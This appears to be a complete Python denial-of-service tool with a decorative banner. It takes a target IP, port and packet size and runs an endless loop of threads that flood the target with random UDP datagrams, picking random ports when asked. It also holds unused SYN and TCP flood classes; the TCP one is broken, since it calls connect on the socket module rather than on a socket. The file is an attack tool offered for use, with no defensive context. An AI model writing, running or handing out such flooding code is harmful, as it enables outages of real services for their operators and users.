#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import threading
import string
import random

attemps = 0 
os.system('clear')
print("""
\033[96m 
       ▒▒█─┐
       ▒▒█ │
█████─╮▒▒█ │▒█─┐                                           
█ ┌──█─╮▒█ │▒█ │
█ │▒▒█ │▒█ │▒█ │
█ │▒▒█ │▒█ │▒█ │
█ │▒▒█ │▒█ │▒█ │
█████  ╯▒█ │▒█ │                                              
█ ┌──█ ╮▒█ │▒█ │                                          
█ │▒▒█ │▒█ │▒█ │
█████ ╭╯▒█ │▒█ │
 └────╯▒▒└─┘▒└─┘
""")
if len(sys.argv) < 4:
    sys.exit("\033[96mUsage: python "+sys.argv[0]+" [ip] [port] [size]\033[0m")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])
class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        time.sleep(3),
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        u.start()
        print(f"\033[38;5;220mProtocol-serv |\033[38;5;37m " +(ip)+ " \033[38;5;220m| \033[33m••>  \033[37m" +str(port)+ "") 
        print(f"\033[38;5;111mProtocol-serv |\033[38;5;214m " +(ip)+ " \033[38;5;220m| \033[33m•>  \033[91m" +str(size)+ "\033[0m") 
    except KeyboardInterrupt:
        print ("Stopping Flood!")
        sys.exit()
    except socket.error as e:
        print ("Socket Couldn't Connect")
        sys.exit()
